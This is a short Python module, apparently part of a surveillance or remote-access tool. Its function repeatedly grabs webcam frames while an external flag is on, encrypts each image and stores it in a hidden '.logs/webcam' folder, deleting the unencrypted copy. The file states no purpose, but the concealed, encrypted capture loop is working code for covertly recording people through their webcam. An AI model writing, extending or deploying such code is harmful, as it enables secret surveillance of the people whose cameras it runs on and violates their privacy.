import cv2
import os
import time
from core.encryptor import encrypt_data

def webcam_loop(active):
    """
    Continuously captures images from webcam, encrypts them, 
    and saves the encrypted version to disk while active["value"] is True.
    """
    os.makedirs(".logs/webcam", exist_ok=True)
    cam = cv2.VideoCapture(0)

    if not cam.isOpened():
        print("[!] Webcam not accessible")
        return

    print("[*] Warming up webcam...")
    for _ in range(10):
        cam.read()
        time.sleep(0.1)

    try:
        while True:
            if active.get("value", False):  # Safe access to the flag
                for _ in range(5):  # Try capturing a non-blank frame
                    ret, frame = cam.read()
                    if ret and frame is not None and frame.any():
                        ts = time.strftime("%Y%m%d_%H%M%S")
                        raw_path = f".logs/webcam/webcam_{ts}.jpg"
                        enc_path = raw_path + ".enc"

                        cv2.imwrite(raw_path, frame)

                        with open(raw_path, "rb") as f:
                            encrypted_data = encrypt_data(f.read())

                        with open(enc_path, "wb") as f:
                            f.write(encrypted_data)

                        os.remove(raw_path)
                        print(f"[+] Captured and encrypted webcam image: {enc_path}")
                        break
                    else:
                        print("[!] Blank frame detected. Retrying...")
                        time.sleep(1)
                time.sleep(10)
            else:
                time.sleep(1)  # Polling delay when inactive
    finally:
        cam.release()
